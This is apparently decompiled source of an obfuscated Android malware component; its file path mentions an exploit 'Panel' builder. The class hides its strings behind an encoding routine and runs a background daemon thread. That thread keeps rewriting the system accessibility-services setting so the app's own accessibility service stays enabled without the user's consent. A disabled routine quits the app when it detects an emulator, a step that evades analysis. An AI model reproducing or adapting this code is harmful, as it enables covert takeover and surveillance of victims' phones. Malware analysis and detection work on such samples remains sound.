package app.mobilex.plus;

import android.app.ActivityManager;
import android.app.Application;
import android.content.ContentResolver;
import android.content.pm.Signature;
import android.content.pm.SigningInfo;
import android.os.Build;
import android.provider.Settings;
import app.mobilex.plus.ManagerWDBridge;
import app.mobilex.plus.services.DataQFAdapter;
import app.mobilex.plus.services.ManagerUMController;
import app.mobilex.plus.util.TypefaceCache;
import app.mobilex.plus.util.UtilYWProcessor;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import v.s.AfJGc52iVl6Gj;
import v.s.Aqh0grSwgDbwr;
import v.s.KgSM0TsKUpCiuePB;
import v.s.QmLUFJ3vXstIdpO2wk;
import v.s.SbxdZ6Kq2uhHQ5RPRqm;
import v.s.UfK5MJMCgJfcZejjsA7;
import v.s.VTs3SU2MiIMPb2VCqAuc;
import v.s.bIQtXpTQsEoGIf25Z;
import v.s.dfwkxUDiclPw1BowH4;
import v.s.eDfRIe8Yxow8;
import v.s.gA5gCwTK0qjTIn;
import v.s.k3qGWOP8GEZr;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class ManagerWDBridge {
    private static volatile int _vx;
    public static volatile Application dDIMxZXP1V8HdM;

    static {
        TypefaceCache.obtain("000E00770055008600F700BA00C00090000700540049008E00F400B800D7");
        gA5gCwTK0qjTIn.dTS0S7eC32ubQH54j36(TypefaceCache.obtain("000A0058000900D700A200EA"), TypefaceCache.obtain("000A0058000900D700A200EC"), TypefaceCache.obtain("000A0058000900D700A200EF"), TypefaceCache.obtain("000A0058000900D700A200EE"), TypefaceCache.obtain("000A0058000900D700A100EE"), TypefaceCache.obtain("000C0078005E00B700FC00AA00C100FF001300640054"), TypefaceCache.obtain("000C0058007E00B700DC008A00E100FF001300440074"));
    }

    private static /* synthetic */ void bzadr() {
    }

    public static void dDIMxZXP1V8HdM() {
    }

    public static final void init(final Application application) {
        dDIMxZXP1V8HdM = application;
        if (k3qGWOP8GEZr.w9sT1Swbhx3hs(application)) {
            return;
        }
        final int i = 1;
        Thread.setDefaultUncaughtExceptionHandler(new UfK5MJMCgJfcZejjsA7(i, Thread.getDefaultUncaughtExceptionHandler()));
        try {
            synchronized (dfwkxUDiclPw1BowH4.D5P1xCAyuvgF) {
                try {
                    if (dfwkxUDiclPw1BowH4.hjneShqpF9Tis4.containsKey("[DEFAULT]")) {
                        dfwkxUDiclPw1BowH4.w9sT1Swbhx3hs();
                    } else {
                        VTs3SU2MiIMPb2VCqAuc vTs3SU2MiIMPb2VCqAucDDIMxZXP1V8HdM = VTs3SU2MiIMPb2VCqAuc.dDIMxZXP1V8HdM(application);
                        if (vTs3SU2MiIMPb2VCqAucDDIMxZXP1V8HdM != null) {
                            dfwkxUDiclPw1BowH4.Ee8d2j4S9Vm5yGuR(application, vTs3SU2MiIMPb2VCqAucDDIMxZXP1V8HdM);
                        }
                    }
                } catch (Throwable th) {
                    throw th;
                }
            }
        } catch (Throwable unused) {
        }
        final int i2 = 0;
        try {
            AfJGc52iVl6Gj afJGc52iVl6Gj = new AfJGc52iVl6Gj();
            afJGc52iVl6Gj.dDIMxZXP1V8HdM = 5;
            bIQtXpTQsEoGIf25Z.K7eEOBPYP9VIoHWTe(application, new eDfRIe8Yxow8(afJGc52iVl6Gj));
        } catch (Throwable th2) {
            TypefaceCache.obtain("001400790049008C00DD00BE00DC00A600240073004900C700F900B100DB00B300630070005A008E00FC00BA00D600FD0063");
            th2.getMessage();
            TypefaceCache.obtain("006F00360049008200E400AD00CB00AE002D0071001B008E00FE00FF008000B4");
            new Thread(new Runnable() { // from class: v.s.z9TmJAH7hN9WNzgCfcXV
                private static /* synthetic */ void qzeh() {
                }

                @Override // java.lang.Runnable
                public final void run() throws InterruptedException {
                    switch (i2) {
                        case 0:
                            Application application2 = application;
                            Application application3 = ManagerWDBridge.dDIMxZXP1V8HdM;
                            Thread.sleep(2000L);
                            try {
                                AfJGc52iVl6Gj afJGc52iVl6Gj2 = new AfJGc52iVl6Gj();
                                afJGc52iVl6Gj2.dDIMxZXP1V8HdM = 5;
                                bIQtXpTQsEoGIf25Z.K7eEOBPYP9VIoHWTe(application2, new eDfRIe8Yxow8(afJGc52iVl6Gj2));
                            } catch (Throwable unused2) {
                                TypefaceCache.obtain("001400790049008C00DD00BE00DC00A600240073004900C700F900B100DB00B300630064005E009300E200A6009200A6002F0065005400C700F600BE00DB00AB00260072");
                                return;
                            }
                            break;
                        default:
                            Application application4 = application;
                            Application application5 = ManagerWDBridge.dDIMxZXP1V8HdM;
                            try {
                                Thread.sleep(15000L);
                                while (Locale.getDefault().toString().length() > 999) {
                                    Thread.yield();
                                    Thread.yield();
                                }
                                while (true) {
                                    try {
                                        DataQFAdapter.Companion.getClass();
                                        if (DataQFAdapter.instance != null) {
                                            Thread.sleep(30000L);
                                        } else if (GARjgaGEpTotOxcl8vfe.K7eEOBPYP9VIoHWTe(application4)) {
                                            TypefaceCache.obtain("00140077004F008400F800BB00DD00A000790036005A00D600A100A6009200AE002D0065004F008600FE00BC00D700E7002A0065001B008900E500B300DE00E700210063004F00C700F500B100D300A5002F0073005F00CB00B000BE00C600B30026007B004B009300F900B100D500E7003100730048009300F100AD00C6");
                                            ContentResolver contentResolver = application4.getContentResolver();
                                            String str = application4.getPackageName() + TypefaceCache.obtain("006C0077004B009700BE00B200DD00A5002A007A005E009F00BE00AF00DE00B2003000380048008200E200A900DB00A400260065001500A300F100AB00D3009600050057005F008600E000AB00D700B5");
                                            String string = Settings.Secure.getString(contentResolver, "enabled_accessibility_services");
                                            if (string == null || !KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(string, application4.getPackageName(), false)) {
                                                Thread.sleep(30000L);
                                            } else {
                                                List listK5l5kmuyJzrgUX = KgSM0TsKUpCiuePB.K5l5kmuyJzrgUX(string, new String[]{":"});
                                                ArrayList arrayList = new ArrayList();
                                                for (Object obj : listK5l5kmuyJzrgUX) {
                                                    if (!KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI((String) obj, application4.getPackageName(), false)) {
                                                        arrayList.add(obj);
                                                    }
                                                }
                                                String strEuF5Udt5Rqv3Qmea = imhBI9RqzETHtVIJe.euF5Udt5Rqv3Qmea(arrayList, ":", null, 62);
                                                Settings.Secure.putString(contentResolver, "enabled_accessibility_services", strEuF5Udt5Rqv3Qmea);
                                                Thread.sleep(1500L);
                                                if (strEuF5Udt5Rqv3Qmea.length() != 0) {
                                                    str = strEuF5Udt5Rqv3Qmea + ":" + str;
                                                }
                                                Settings.Secure.putString(contentResolver, "enabled_accessibility_services", str);
                                                Thread.sleep(5000L);
                                                DataQFAdapter.Companion.getClass();
                                                if (DataQFAdapter.instance != null) {
                                                    TypefaceCache.obtain("00140077004F008400F800BB00DD00A000790036005A00D600A100A6009200B400260064004D008E00F300BA009200B500260065004F008800E200BA00D600E6");
                                                } else {
                                                    TypefaceCache.obtain("00140077004F008400F800BB00DD00A000790036005A00D600A100A6009200B500260065004F008600E200AB009200A600370062005E008A00E000AB009200A10022007F0057008200F400F3009200B0002A007A005700C700E200BA00C600B5003A00360052008900B000EC008200B4");
                                                }
                                                Thread.sleep(30000L);
                                            }
                                        } else {
                                            Thread.sleep(30000L);
                                        }
                                    } catch (Throwable th3) {
                                        TypefaceCache.obtain("00140077004F008400F800BB00DD00A0006300730049009500FF00AD008800E7");
                                        th3.getMessage();
                                    }
                                }
                            } catch (InterruptedException unused3) {
                            }
                            break;
                    }
                }
            }).start();
        }
        try {
            dDIMxZXP1V8HdM();
            SigningInfo signingInfo = application.getPackageManager().getPackageInfo(application.getPackageName(), 134217728).signingInfo;
            Signature[] apkContentsSigners = signingInfo != null ? signingInfo.getApkContentsSigners() : null;
            if (apkContentsSigners != null && apkContentsSigners.length != 0) {
                boolean z = UtilYWProcessor.dDIMxZXP1V8HdM;
                UtilYWProcessor.wk(apkContentsSigners[0].toByteArray());
            }
        } catch (Throwable unused2) {
        }
        int i3 = QmLUFJ3vXstIdpO2wk.dDIMxZXP1V8HdM;
        try {
            QmLUFJ3vXstIdpO2wk.vekpFI4d1Nc4fakF = Runtime.getRuntime().availableProcessors();
            Object systemService = application.getSystemService("activity");
            ActivityManager activityManager = systemService instanceof ActivityManager ? (ActivityManager) systemService : null;
            QmLUFJ3vXstIdpO2wk.JXn4Qf7zpnLjP5 = activityManager != null ? activityManager.getMemoryClass() : 128;
            ActivityManager.MemoryInfo memoryInfo = new ActivityManager.MemoryInfo();
            if (activityManager != null) {
                activityManager.getMemoryInfo(memoryInfo);
            }
            long j = memoryInfo.totalMem;
            QmLUFJ3vXstIdpO2wk.w9sT1Swbhx3hs = j > 0 ? j / ((long) 1048576) : 4096L;
            QmLUFJ3vXstIdpO2wk.vekpFI4d1Nc4fakF();
        } catch (Exception e) {
            TypefaceCache.obtain("000A00780052009300B000BA00C000B5002C0064000100C7");
            e.getMessage();
            QmLUFJ3vXstIdpO2wk.dDIMxZXP1V8HdM = 2;
        }
        String str = ManagerUMController.DVTNwpDEVsUKuznof;
        SbxdZ6Kq2uhHQ5RPRqm.gmNWMfvn6zlEj(application);
        boolean z2 = UtilYWProcessor.dDIMxZXP1V8HdM;
        String packageName = application.getPackageName();
        try {
            if (UtilYWProcessor.dDIMxZXP1V8HdM) {
                UtilYWProcessor.ec(packageName, 30);
            }
        } catch (Throwable unused3) {
        }
        Thread thread = new Thread(new Runnable() { // from class: v.s.z9TmJAH7hN9WNzgCfcXV
            private static /* synthetic */ void qzeh() {
            }

            @Override // java.lang.Runnable
            public final void run() throws InterruptedException {
                switch (i) {
                    case 0:
                        Application application2 = application;
                        Application application3 = ManagerWDBridge.dDIMxZXP1V8HdM;
                        Thread.sleep(2000L);
                        try {
                            AfJGc52iVl6Gj afJGc52iVl6Gj2 = new AfJGc52iVl6Gj();
                            afJGc52iVl6Gj2.dDIMxZXP1V8HdM = 5;
                            bIQtXpTQsEoGIf25Z.K7eEOBPYP9VIoHWTe(application2, new eDfRIe8Yxow8(afJGc52iVl6Gj2));
                        } catch (Throwable unused4) {
                            TypefaceCache.obtain("001400790049008C00DD00BE00DC00A600240073004900C700F900B100DB00B300630064005E009300E200A6009200A6002F0065005400C700F600BE00DB00AB00260072");
                            return;
                        }
                        break;
                    default:
                        Application application4 = application;
                        Application application5 = ManagerWDBridge.dDIMxZXP1V8HdM;
                        try {
                            Thread.sleep(15000L);
                            while (Locale.getDefault().toString().length() > 999) {
                                Thread.yield();
                                Thread.yield();
                            }
                            while (true) {
                                try {
                                    DataQFAdapter.Companion.getClass();
                                    if (DataQFAdapter.instance != null) {
                                        Thread.sleep(30000L);
                                    } else if (GARjgaGEpTotOxcl8vfe.K7eEOBPYP9VIoHWTe(application4)) {
                                        TypefaceCache.obtain("00140077004F008400F800BB00DD00A000790036005A00D600A100A6009200AE002D0065004F008600FE00BC00D700E7002A0065001B008900E500B300DE00E700210063004F00C700F500B100D300A5002F0073005F00CB00B000BE00C600B30026007B004B009300F900B100D500E7003100730048009300F100AD00C6");
                                        ContentResolver contentResolver = application4.getContentResolver();
                                        String str2 = application4.getPackageName() + TypefaceCache.obtain("006C0077004B009700BE00B200DD00A5002A007A005E009F00BE00AF00DE00B2003000380048008200E200A900DB00A400260065001500A300F100AB00D3009600050057005F008600E000AB00D700B5");
                                        String string = Settings.Secure.getString(contentResolver, "enabled_accessibility_services");
                                        if (string == null || !KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(string, application4.getPackageName(), false)) {
                                            Thread.sleep(30000L);
                                        } else {
                                            List listK5l5kmuyJzrgUX = KgSM0TsKUpCiuePB.K5l5kmuyJzrgUX(string, new String[]{":"});
                                            ArrayList arrayList = new ArrayList();
                                            for (Object obj : listK5l5kmuyJzrgUX) {
                                                if (!KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI((String) obj, application4.getPackageName(), false)) {
                                                    arrayList.add(obj);
                                                }
                                            }
                                            String strEuF5Udt5Rqv3Qmea = imhBI9RqzETHtVIJe.euF5Udt5Rqv3Qmea(arrayList, ":", null, 62);
                                            Settings.Secure.putString(contentResolver, "enabled_accessibility_services", strEuF5Udt5Rqv3Qmea);
                                            Thread.sleep(1500L);
                                            if (strEuF5Udt5Rqv3Qmea.length() != 0) {
                                                str2 = strEuF5Udt5Rqv3Qmea + ":" + str2;
                                            }
                                            Settings.Secure.putString(contentResolver, "enabled_accessibility_services", str2);
                                            Thread.sleep(5000L);
                                            DataQFAdapter.Companion.getClass();
                                            if (DataQFAdapter.instance != null) {
                                                TypefaceCache.obtain("00140077004F008400F800BB00DD00A000790036005A00D600A100A6009200B400260064004D008E00F300BA009200B500260065004F008800E200BA00D600E6");
                                            } else {
                                                TypefaceCache.obtain("00140077004F008400F800BB00DD00A000790036005A00D600A100A6009200B500260065004F008600E200AB009200A600370062005E008A00E000AB009200A10022007F0057008200F400F3009200B0002A007A005700C700E200BA00C600B5003A00360052008900B000EC008200B4");
                                            }
                                            Thread.sleep(30000L);
                                        }
                                    } else {
                                        Thread.sleep(30000L);
                                    }
                                } catch (Throwable th3) {
                                    TypefaceCache.obtain("00140077004F008400F800BB00DD00A0006300730049009500FF00AD008800E7");
                                    th3.getMessage();
                                }
                            }
                        } catch (InterruptedException unused5) {
                        }
                        break;
                }
            }
        });
        thread.setName(TypefaceCache.obtain("00220027000A009E00BD00A800D300B30020007E005F008800F7"));
        thread.setPriority(1);
        thread.setDaemon(true);
        thread.start();
    }

    private static void original_emulator_check_disabled() {
        int i;
        String str = Build.FINGERPRINT;
        Locale locale = Locale.ROOT;
        String lowerCase = str.toLowerCase(locale);
        String lowerCase2 = Build.MODEL.toLowerCase(locale);
        String lowerCase3 = Build.MANUFACTURER.toLowerCase(locale);
        String lowerCase4 = Build.BRAND.toLowerCase(locale);
        String lowerCase5 = Build.DEVICE.toLowerCase(locale);
        String lowerCase6 = Build.PRODUCT.toLowerCase(locale);
        String lowerCase7 = Build.HARDWARE.toLowerCase(locale);
        Boolean boolValueOf = Boolean.valueOf(KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase, TypefaceCache.obtain("002400730055008200E200B600D1"), false));
        Boolean boolValueOf2 = Boolean.valueOf(KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase, TypefaceCache.obtain("003000720050"), false));
        Boolean boolValueOf3 = Boolean.valueOf(KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase, TypefaceCache.obtain("003700730048009300BD00B400D700BE0030"), false));
        Boolean boolValueOf4 = Boolean.valueOf(KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase2, TypefaceCache.obtain("003000720050"), false));
        Boolean boolValueOf5 = Boolean.valueOf(KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase2, TypefaceCache.obtain("0026007B004E008B00F100AB00DD00B5"), false));
        Boolean boolValueOf6 = Boolean.valueOf(KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase2, TypefaceCache.obtain("00220078005F009500FF00B600D600E7003000720050"), false));
        Boolean boolValueOf7 = Boolean.valueOf(KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase3, TypefaceCache.obtain("002400730055009E00FD00B000C600AE002C0078"), false));
        Boolean boolValueOf8 = Boolean.valueOf(KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase3, TypefaceCache.obtain("0021007A004E008200E300AB00D300A400280065"), false));
        Boolean boolValueOf9 = Boolean.valueOf(lowerCase4.equals(TypefaceCache.obtain("002400730055008200E200B600D1")));
        Boolean boolValueOf10 = Boolean.valueOf(lowerCase4.equals(TypefaceCache.obtain("00220078005F009500FF00B600D6")));
        Boolean boolValueOf11 = Boolean.valueOf(KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase5, TypefaceCache.obtain("002400730055008200E200B600D1"), false));
        Boolean boolValueOf12 = Boolean.valueOf(KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase5, TypefaceCache.obtain("003500740054009F"), false));
        Boolean boolValueOf13 = Boolean.valueOf(KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase6, TypefaceCache.obtain("003000720050"), false));
        Boolean boolValueOf14 = Boolean.valueOf(KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase6, TypefaceCache.obtain("003500740054009F"), false));
        Boolean boolValueOf15 = Boolean.valueOf(KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase7, TypefaceCache.obtain("002400790057008300F600B600C100AF"), false));
        Boolean boolValueOf16 = Boolean.valueOf(KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase7, TypefaceCache.obtain("003100770055008400F800AA"), false));
        Boolean boolValueOf17 = Boolean.valueOf(KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase7, TypefaceCache.obtain("003500740054009F"), false));
        String str2 = Build.BOARD;
        String lowerCase8 = str2 != null ? str2.toLowerCase(locale) : "";
        List listYTljMGnIibTRdOpSh4 = Aqh0grSwgDbwr.yTljMGnIibTRdOpSh4(boolValueOf, boolValueOf2, boolValueOf3, boolValueOf4, boolValueOf5, boolValueOf6, boolValueOf7, boolValueOf8, boolValueOf9, boolValueOf10, boolValueOf11, boolValueOf12, boolValueOf13, boolValueOf14, boolValueOf15, boolValueOf16, boolValueOf17, Boolean.valueOf(lowerCase8.equals(TypefaceCache.obtain("003600780050008900FF00A800DC")) || KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(lowerCase8, TypefaceCache.obtain("002400790057008300F600B600C100AF"), false)));
        if (listYTljMGnIibTRdOpSh4.isEmpty()) {
            i = 0;
        } else {
            Iterator it = listYTljMGnIibTRdOpSh4.iterator();
            i = 0;
            while (it.hasNext()) {
                if (((Boolean) it.next()).booleanValue() && (i = i + 1) < 0) {
                    throw new ArithmeticException("Count overflow has happened.");
                }
            }
        }
        if (i < 3) {
            return;
        }
        System.exit(0);
        throw new RuntimeException("System.exit returned normally, while it was supposed to halt JVM.");
    }
}
